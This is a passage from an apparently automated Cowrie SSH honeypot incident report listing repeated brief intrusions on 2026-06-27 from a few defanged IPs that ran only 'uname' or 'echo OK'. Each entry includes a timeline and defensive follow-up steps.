| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:15:02` | `cowrie.session.connect` |
| `2026-06-27 11:15:02` | `cowrie.client.version` |
| `2026-06-27 11:15:02` | `cowrie.client.kex` |
| `2026-06-27 11:15:03` | `cowrie.login.success` |
| `2026-06-27 11:15:03` | `cowrie.session.params` |
| `2026-06-27 11:15:03` | `cowrie.command.input` |
| `2026-06-27 11:15:04` | `cowrie.log.closed` |
| `2026-06-27 11:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-195bf3599830

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 11:15 |
| **Last Seen** | 2026-06-27 11:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:15:54` | `cowrie.session.connect` |
| `2026-06-27 11:15:55` | `cowrie.client.version` |
| `2026-06-27 11:15:55` | `cowrie.client.kex` |
| `2026-06-27 11:15:57` | `cowrie.login.success` |
| `2026-06-27 11:15:58` | `cowrie.session.params` |
| `2026-06-27 11:15:58` | `cowrie.command.input` |
| `2026-06-27 11:15:59` | `cowrie.log.closed` |
| `2026-06-27 11:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-539b437747fb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:15 |
| **Last Seen** | 2026-06-27 11:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:15:55` | `cowrie.session.connect` |
| `2026-06-27 11:15:55` | `cowrie.client.version` |
| `2026-06-27 11:15:55` | `cowrie.client.kex` |
| `2026-06-27 11:15:55` | `cowrie.login.success` |
| `2026-06-27 11:15:56` | `cowrie.session.params` |
| `2026-06-27 11:15:56` | `cowrie.command.input` |
| `2026-06-27 11:15:56` | `cowrie.log.closed` |
| `2026-06-27 11:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2df092bda8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:16 |
| **Last Seen** | 2026-06-27 11:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:16:48` | `cowrie.session.connect` |
| `2026-06-27 11:16:48` | `cowrie.client.version` |
| `2026-06-27 11:16:48` | `cowrie.client.kex` |
| `2026-06-27 11:16:48` | `cowrie.login.success` |
| `2026-06-27 11:16:49` | `cowrie.session.params` |
| `2026-06-27 11:16:49` | `cowrie.command.input` |
| `2026-06-27 11:16:49` | `cowrie.log.closed` |
| `2026-06-27 11:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18818761ad9d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:17 |
| **Last Seen** | 2026-06-27 11:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:17:45` | `cowrie.session.connect` |
| `2026-06-27 11:17:45` | `cowrie.client.version` |
| `2026-06-27 11:17:45` | `cowrie.client.kex` |
| `2026-06-27 11:17:45` | `cowrie.login.success` |
| `2026-06-27 11:17:46` | `cowrie.session.params` |
| `2026-06-27 11:17:46` | `cowrie.command.input` |
| `2026-06-27 11:17:46` | `cowrie.log.closed` |
| `2026-06-27 11:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb849a842459

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:18 |
| **Last Seen** | 2026-06-27 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:18:43` | `cowrie.session.connect` |
| `2026-06-27 11:18:43` | `cowrie.client.version` |
| `2026-06-27 11:18:43` | `cowrie.client.kex` |
| `2026-06-27 11:18:43` | `cowrie.login.success` |
| `2026-06-27 11:18:44` | `cowrie.session.params` |
| `2026-06-27 11:18:44` | `cowrie.command.input` |
| `2026-06-27 11:18:44` | `cowrie.log.closed` |
| `2026-06-27 11:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4552c5aedd96

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:19 |
| **Last Seen** | 2026-06-27 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:19:39` | `cowrie.session.connect` |
| `2026-06-27 11:19:39` | `cowrie.client.version` |
| `2026-06-27 11:19:39` | `cowrie.client.kex` |
| `2026-06-27 11:19:40` | `cowrie.login.success` |
| `2026-06-27 11:19:40` | `cowrie.session.params` |
| `2026-06-27 11:19:40` | `cowrie.command.input` |
| `2026-06-27 11:19:40` | `cowrie.log.closed` |
| `2026-06-27 11:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d760863decd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:20 |
| **Last Seen** | 2026-06-27 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:20:39` | `cowrie.session.connect` |
| `2026-06-27 11:20:39` | `cowrie.client.version` |
| `2026-06-27 11:20:39` | `cowrie.client.kex` |
| `2026-06-27 11:20:39` | `cowrie.login.success` |
| `2026-06-27 11:20:40` | `cowrie.session.params` |
| `2026-06-27 11:20:40` | `cowrie.command.input` |
| `2026-06-27 11:20:40` | `cowrie.log.closed` |
| `2026-06-27 11:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d1150eba0c2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:21 |
| **Last Seen** | 2026-06-27 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:21:34` | `cowrie.session.connect` |
| `2026-06-27 11:21:34` | `cowrie.client.version` |
| `2026-06-27 11:21:34` | `cowrie.client.kex` |
| `2026-06-27 11:21:34` | `cowrie.login.success` |
| `2026-06-27 11:21:35` | `cowrie.session.params` |
| `2026-06-27 11:21:35` | `cowrie.command.input` |
| `2026-06-27 11:21:35` | `cowrie.log.closed` |
| `2026-06-27 11:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93d8925d3262

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:22 |
| **Last Seen** | 2026-06-27 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:22:28` | `cowrie.session.connect` |
| `2026-06-27 11:22:28` | `cowrie.client.version` |
| `2026-06-27 11:22:28` | `cowrie.client.kex` |
| `2026-06-27 11:22:29` | `cowrie.login.success` |
| `2026-06-27 11:22:29` | `cowrie.session.params` |
| `2026-06-27 11:22:29` | `cowrie.command.input` |
| `2026-06-27 11:22:30` | `cowrie.log.closed` |
| `2026-06-27 11:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b632d96e65f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 11:22 |
| **Last Seen** | 2026-06-27 11:22 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:22:41` | `cowrie.session.connect` |
| `2026-06-27 11:22:42` | `cowrie.client.version` |
| `2026-06-27 11:22:42` | `cowrie.client.kex` |
| `2026-06-27 11:22:48` | `cowrie.login.success` |
| `2026-06-27 11:22:51` | `cowrie.session.params` |
| `2026-06-27 11:22:51` | `cowrie.command.input` |
| `2026-06-27 11:22:52` | `cowrie.log.closed` |
| `2026-06-27 11:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-521b2ee1c813

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:23 |
| **Last Seen** | 2026-06-27 11:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:23:24` | `cowrie.session.connect` |
| `2026-06-27 11:23:24` | `cowrie.client.version` |
| `2026-06-27 11:23:24` | `cowrie.client.kex` |
| `2026-06-27 11:23:25` | `cowrie.login.success` |
| `2026-06-27 11:23:25` | `cowrie.session.params` |
| `2026-06-27 11:23:25` | `cowrie.command.input` |
| `2026-06-27 11:23:25` | `cowrie.log.closed` |
| `2026-06-27 11:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0be1904dd9da

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:24 |
| **Last Seen** | 2026-06-27 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:24:23` | `cowrie.session.connect` |
| `2026-06-27 11:24:23` | `cowrie.client.version` |
| `2026-06-27 11:24:23` | `cowrie.client.kex` |
| `2026-06-27 11:24:24` | `cowrie.login.success` |
| `2026-06-27 11:24:24` | `cowrie.session.params` |
| `2026-06-27 11:24:24` | `cowrie.command.input` |
| `2026-06-27 11:24:25` | `cowrie.log.closed` |
| `2026-06-27 11:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f27be975cd30

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:25 |
| **Last Seen** | 2026-06-27 11:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:25:19` | `cowrie.session.connect` |
| `2026-06-27 11:25:19` | `cowrie.client.version` |
| `2026-06-27 11:25:19` | `cowrie.client.kex` |
| `2026-06-27 11:25:20` | `cowrie.login.success` |
| `2026-06-27 11:25:21` | `cowrie.session.params` |
| `2026-06-27 11:25:21` | `cowrie.command.input` |
| `2026-06-27 11:25:21` | `cowrie.log.closed` |
| `2026-06-27 11:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a10a73646a28

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:26 |
| **Last Seen** | 2026-06-27 11:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:26:18` | `cowrie.session.connect` |
| `2026-06-27 11:26:18` | `cowrie.client.version` |
| `2026-06-27 11:26:18` | `cowrie.client.kex` |
| `2026-06-27 11:26:18` | `cowrie.login.success` |
| `2026-06-27 11:26:19` | `cowrie.session.params` |
| `2026-06-27 11:26:19` | `cowrie.command.input` |
| `2026-06-27 11:26:19` | `cowrie.log.closed` |
| `2026-06-27 11:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc616231a17f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:27 |
| **Last Seen** | 2026-06-27 11:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:27:15` | `cowrie.session.connect` |
| `2026-06-27 11:27:15` | `cowrie.client.version` |
| `2026-06-27 11:27:15` | `cowrie.client.kex` |
| `2026-06-27 11:27:16` | `cowrie.login.success` |
| `2026-06-27 11:27:16` | `cowrie.session.params` |
| `2026-06-27 11:27:16` | `cowrie.command.input` |
| `2026-06-27 11:27:17` | `cowrie.log.closed` |
| `2026-06-27 11:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42559675d1df

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:28 |
| **Last Seen** | 2026-06-27 11:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:28:17` | `cowrie.session.connect` |
| `2026-06-27 11:28:17` | `cowrie.client.version` |
| `2026-06-27 11:28:17` | `cowrie.client.kex` |
| `2026-06-27 11:28:17` | `cowrie.login.success` |
| `2026-06-27 11:28:18` | `cowrie.session.params` |
| `2026-06-27 11:28:18` | `cowrie.command.input` |
| `2026-06-27 11:28:18` | `cowrie.log.closed` |
| `2026-06-27 11:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d97ffcaaf8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:29 |
| **Last Seen** | 2026-06-27 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:29:21` | `cowrie.session.connect` |
| `2026-06-27 11:29:21` | `cowrie.client.version` |
| `2026-06-27 11:29:21` | `cowrie.client.kex` |
| `2026-06-27 11:29:22` | `cowrie.login.success` |
| `2026-06-27 11:29:23` | `cowrie.session.params` |
| `2026-06-27 11:29:23` | `cowrie.command.input` |
| `2026-06-27 11:29:23` | `cowrie.log.closed` |
| `2026-06-27 11:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e646e39b0e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:30 |
| **Last Seen** | 2026-06-27 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:30:20` | `cowrie.session.connect` |
| `2026-06-27 11:30:20` | `cowrie.client.version` |
| `2026-06-27 11:30:20` | `cowrie.client.kex` |
| `2026-06-27 11:30:20` | `cowrie.login.success` |
| `2026-06-27 11:30:21` | `cowrie.session.params` |
| `2026-06-27 11:30:21` | `cowrie.command.input` |
| `2026-06-27 11:30:21` | `cowrie.log.closed` |
| `2026-06-27 11:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e24032f17625

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 11:30 |
| **Last Seen** | 2026-06-27 11:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:30:26` | `cowrie.session.connect` |
| `2026-06-27 11:30:26` | `cowrie.client.version` |
| `2026-06-27 11:30:26` | `cowrie.client.kex` |
| `2026-06-27 11:30:28` | `cowrie.login.success` |
| `2026-06-27 11:30:29` | `cowrie.session.params` |
| `2026-06-27 11:30:29` | `cowrie.command.input` |
| `2026-06-27 11:30:29` | `cowrie.log.closed` |
| `2026-06-27 11:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-befc155b4d03

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:31 |
| **Last Seen** | 2026-06-27 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:31:22` | `cowrie.session.connect` |
| `2026-06-27 11:31:22` | `cowrie.client.version` |
| `2026-06-27 11:31:23` | `cowrie.client.kex` |
| `2026-06-27 11:31:23` | `cowrie.login.success` |
| `2026-06-27 11:31:24` | `cowrie.session.params` |
| `2026-06-27 11:31:24` | `cowrie.command.input` |
| `2026-06-27 11:31:24` | `cowrie.log.closed` |
| `2026-06-27 11:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76337520a244

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:32 |
| **Last Seen** | 2026-06-27 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:32:23` | `cowrie.session.connect` |
| `2026-06-27 11:32:23` | `cowrie.client.version` |
| `2026-06-27 11:32:23` | `cowrie.client.kex` |
| `2026-06-27 11:32:23` | `cowrie.login.success` |
| `2026-06-27 11:32:24` | `cowrie.session.params` |
| `2026-06-27 11:32:24` | `cowrie.command.input` |
| `2026-06-27 11:32:24` | `cowrie.log.closed` |
| `2026-06-27 11:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77e4a072e6c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:33 |
| **Last Seen** | 2026-06-27 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:33:22` | `cowrie.session.connect` |
| `2026-06-27 11:33:22` | `cowrie.client.version` |
| `2026-06-27 11:33:22` | `cowrie.client.kex` |
| `2026-06-27 11:33:22` | `cowrie.login.success` |
| `2026-06-27 11:33:23` | `cowrie.session.params` |
| `2026-06-27 11:33:23` | `cowrie.command.input` |
| `2026-06-27 11:33:23` | `cowrie.log.closed` |
| `2026-06-27 11:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3915e06a5bd9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 11:33 |
| **Last Seen** | 2026-06-27 11:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:33:50` | `cowrie.session.connect` |
| `2026-06-27 11:33:51` | `cowrie.client.version` |
| `2026-06-27 11:33:51` | `cowrie.client.kex` |
| `2026-06-27 11:33:58` | `cowrie.login.success` |
| `2026-06-27 11:34:01` | `cowrie.session.params` |
| `2026-06-27 11:34:01` | `cowrie.command.input` |
| `2026-06-27 11:34:03` | `cowrie.log.closed` |
| `2026-06-27 11:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43589b6eb856

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:34 |
| **Last Seen** | 2026-06-27 11:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:34:24` | `cowrie.session.connect` |
| `2026-06-27 11:34:24` | `cowrie.client.version` |
| `2026-06-27 11:34:24` | `cowrie.client.kex` |
| `2026-06-27 11:34:25` | `cowrie.login.success` |
| `2026-06-27 11:34:25` | `cowrie.session.params` |
| `2026-06-27 11:34:25` | `cowrie.command.input` |
| `2026-06-27 11:34:26` | `cowrie.log.closed` |
| `2026-06-27 11:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bfd98443f66

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:35 |
| **Last Seen** | 2026-06-27 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:35:27` | `cowrie.session.connect` |
| `2026-06-27 11:35:27` | `cowrie.client.version` |
| `2026-06-27 11:35:27` | `cowrie.client.kex` |
| `2026-06-27 11:35:27` | `cowrie.login.success` |
| `2026-06-27 11:35:28` | `cowrie.session.params` |
| `2026-06-27 11:35:28` | `cowrie.command.input` |
| `2026-06-27 11:35:28` | `cowrie.log.closed` |
| `2026-06-27 11:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

